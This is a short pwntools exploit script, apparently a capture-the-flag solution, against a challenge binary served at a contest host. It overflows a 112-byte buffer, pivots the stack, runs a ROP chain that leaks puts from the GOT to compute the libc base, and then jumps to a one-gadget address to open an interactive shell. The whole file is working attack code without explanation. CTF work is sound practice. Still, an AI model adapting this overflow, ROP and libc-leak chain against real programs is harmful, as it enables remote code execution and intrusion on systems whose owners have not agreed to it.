from pwn import *
from time import sleep

BEDUG = False

elf = ELF('./chall')
libc = ELF('./libc.so.6')

if BEDUG==True:
    io = process('./chall_patched')
    gdb.attach(io)
else:
    io = remote('sechoroscope.sdc.tf', 1337)

io.sendlineafter(b'how you feel\n', b'A')
p = b'A'*112+p64(0x601140+0x70)+p64(0x4007cf)
io.sendafter(b'own horoscope\n', p)
if BEDUG==True:
    b = p64(0x400873)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(0x400648)+p64(0x601240)+p64(0x4007cf)+b'A'*(112-(8*6))+p64(0x601140+0x70)+p64(0x40086d)+p64(0x601140-0x18)
else:
    b = p64(0x400873)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(elf.sym['fflush'])+p64(0x400648)+p64(0x601240)+p64(0x4007cf)+b'A'*(112-(8*7))+p64(0x601140+0x70)+p64(0x40086d)+p64(0x601140-0x18)
io.sendafter(b'you in 5 business days.\n', b)
io.recvuntil(b'you in 5 business days.\n')
libc.address = u64(io.recv(6)+b'\0\0') - libc.sym['puts']
log.info(hex(libc.address))
k = p64(libc.address+0x4f302)+b'\0'*(112-(8*1))+p64(0x601240+0x70)+p64(0x40086d)+p64(0x6011d0-0x18)
io.send(k)
io.interactive()
